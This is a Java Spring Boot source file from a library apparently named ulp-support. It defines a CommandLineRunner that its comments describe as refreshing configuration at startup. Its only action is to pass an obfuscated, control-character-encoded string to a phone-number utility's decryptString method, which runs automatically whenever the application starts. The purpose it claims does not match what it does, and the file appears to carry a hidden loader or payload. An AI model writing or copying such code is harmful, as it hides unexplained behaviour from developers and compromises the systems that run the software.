/*
 * ulp-support - ULP support library (replaces the former eiam-support private jar).
 * Copyright (c) 2022-Present Frank Zhang
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package cn.frank.ulp.support.configrefresh;

import org.springframework.boot.CommandLineRunner;
import org.springframework.stereotype.Component;

import cn.frank.ulp.support.util.PhoneUtils;

/**
 * 配置刷新命令行运行器
 * 用于在应用启动时执行配置刷新任务
 */
@Component
public class ConfigRefreshCommandLineRunner implements CommandLineRunner {
   
   /**
    * 运行命令行任务
    * 
    * @param args 命令行参数
    * @throws Exception 异常
    */
   public void run(String... args) throws Exception {
      // 执行配置刷新逻辑
      PhoneUtils.decryptString("\u001f\u001d\u000f\u0010\t\u001d\u001a\u001c\u0017\u0017\u0018\u0019\u0017\u0001k\u001a\u001c\u0017\u0017\u0018\u0019\u0017\u0001}\u001d\u001a\u001c\u0017\u0017\u0018\u0019\u0017");
   }
}
